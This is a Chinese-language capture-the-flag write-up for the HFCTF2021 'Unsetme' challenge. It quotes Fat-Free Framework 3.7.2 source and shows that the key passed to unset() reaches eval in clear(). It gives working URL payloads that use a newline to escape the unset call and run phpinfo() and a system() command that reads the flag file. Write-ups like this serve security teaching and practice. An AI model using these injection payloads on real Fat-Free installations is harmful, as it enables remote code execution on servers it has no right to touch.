---
title: '[HFCTF2021 Quals]Unsetme'
date: 2024-11-06 20:07:22
tags: 
      - 漏洞
      - 框架
      - f3框架漏洞
categories: 刷题笔记
---

## [HFCTF2021 Quals]Unsetme

我们来进行代码审阅

```
<?php

// Kickstart the framework
$f3=require('lib/base.php');//引入f3框架源码

$f3->set('DEBUG',1);//f3对象设置DEBUG属性
if ((float)PCRE_VERSION<8.0)
    trigger_error('PCRE version is out of date');//判断PCRE版本

highlight_file(__FILE__);//高亮显示源码
$a=$_GET['a'];//读取get方法的a参数的值
unset($f3->$a);//调用unset函数，去除f3对象中的$a属性

$f3->run();//启动f3框架

```

看题目我们真的用了f3框架，而f3框架3.7.1版本存在rce漏洞 CVE-2020-5203

但我们不能直接复原原漏洞，因为在/lib/CHANGELOG.md中发现他用的是3.7.2的版本

在原来rce的地方加上了正则匹配

关键代码在lib/base.php下

```
function compile($str, $evaluate=TRUE) {
		return (!$evaluate)
			? preg_replace_callback(
				'/^@(\w+)((?:\..+|\[(?:(?:[^\[\]]*|(?R))*)\])*)/',
				function($expr) {
					$str='$'.$expr[1];
					if (isset($expr[2]))
						$str.=preg_replace_callback(
							'/\.([^.\[\]]+)|\[((?:[^\[\]\'"]*|(?R))*)\]/',
							function($sub) {
								$val=isset($sub[2]) ? $sub[2] : $sub[1];
								if (ctype_digit($val))
									$val=(int)$val;
								$out='['.$this->export($val).']';
								return $out;
							},
							$expr[2]
						);
					return $str;
				},
				$str
			)
			: preg_replace_callback(
			'/(?<!\w)@(\w+(?:(?:\->|::)\w+)?)'.
			'((?:\.\w+|\[(?:(?:[^\[\]]*|(?R))*)\]|(?:\->|::)\w+|\()*)/',
			function($expr) {
				$str='$'.$expr[1];
				if (isset($expr[2]))
					$str.=preg_replace_callback(
						'/\.(\w+)(\()?|\[((?:[^\[\]]*|(?R))*)\]/',
						function($sub) {
							if (empty($sub[2])) {
								if (ctype_digit($sub[1]))
									$sub[1]=(int)$sub[1];
								$out='['.
									(isset($sub[3])?
										$this->compile($sub[3]):
										$this->export($sub[1])).
								']';
							}
							else
								$out=function_exists($sub[1])?
									$sub[0]:
									('['.$this->export($sub[1]).']'.$sub[2]);
							return $out;
						},
						$expr[2]
					);
				return $str;
			},
			$str
		);
	}

```

compile是修改后加了函数的地方

```
	function __unset($key) {
		$this->offsetunset($key);
	}
	function clear($key) {
		// Normalize array literal
		$cache=Cache::instance();
		$parts=$this->cut($key);
		if ($key=='CACHE')
			// Clear cache contents
			$cache->reset();
		elseif (preg_match('/^(GET|POST|COOKIE)\b(.+)/',$key,$expr)) {
			$this->clear('REQUEST'.$expr[2]);
			if ($expr[1]=='COOKIE') {
				$parts=$this->cut($key);
				$jar=$this->hive['JAR'];
				unset($jar['lifetime']);
				$jar['expire']=0;
				if (version_compare(PHP_VERSION, '7.3.0') >= 0) {
					$jar['expires']=$jar['expire'];
					unset($jar['expire']);
					setcookie($parts[1],NULL,$jar);
				} else {
					unset($jar['samesite']);
					call_user_func_array('setcookie',
						array_merge([$parts[1],NULL],$jar));
				}
				unset($_COOKIE[$parts[1]]);
			}
		}
		elseif ($parts[0]=='SESSION') {
			if (!headers_sent() && session_status()!=PHP_SESSION_ACTIVE)
				session_start();
			if (empty($parts[1])) {
				// End session
				session_unset();
				session_destroy();
				$this->clear('COOKIE.'.session_name());
			}
			$this->sync('SESSION');
		}
		if (!isset($parts[1]) && array_key_exists($parts[0],$this->init))
			// Reset global to default value
			$this->hive[$parts[0]]=$this->init[$parts[0]];
		else {
			$val=preg_replace('/^(\$hive)/','$this->hive',
				$this->compile('@hive.'.$key, FALSE));
			eval('unset('.$val.');');
			if ($parts[0]=='SESSION') {
				session_commit();
				session_start();
			}
			if ($cache->exists($hash=$this->hash($key).'.var'))
				// Remove from cache
				$cache->clear($hash);
		}
	}


```

> 这里是执行RCE的地方，和3.7.1比没有修改
>
> 我们已知使用unset()销毁并不能销毁的变量时会调用__unset()方法，这里会把我们传入的参数赋值到\$key，经过过滤后执行eval，可以发现eval处只是简单的字符串拼接，用分号闭合后就可以在后面构造代码进行RCE了
> compile处最后返回的$str是@hive.xxxxx的形式
>
> 主要看一下第二个正则`/\.([^.\[\]]+)|\[((?:[^\[\]\'"]*|(?R))*)\]/`
>
> 这里匹配的是以`.`开始后面是字符串加`[]`的形式或`[]`包裹字符串的形式

我们尝试闭合unset

```
?a=a%0a);phpinfo(
```

![image-20241106203438796](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411062034851.png)

成功执行

那我们进行rce

```
?a=a[b]%0a);system("cat%20../../../flag"
```

得到flag

![image-20241106203552123](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411062035161.png)

## 补充

在外面构造payload时，我们发现?a=a);phpinfo(不可以，但?a=a%0a);phpinfo(可以

因为我们需要用%0a进行换行处理

```
unset($f3->a);phpinfo();
```

如果不换行，就会导致php解释器将整行的字符当作unset的参数处理，导致语法错误
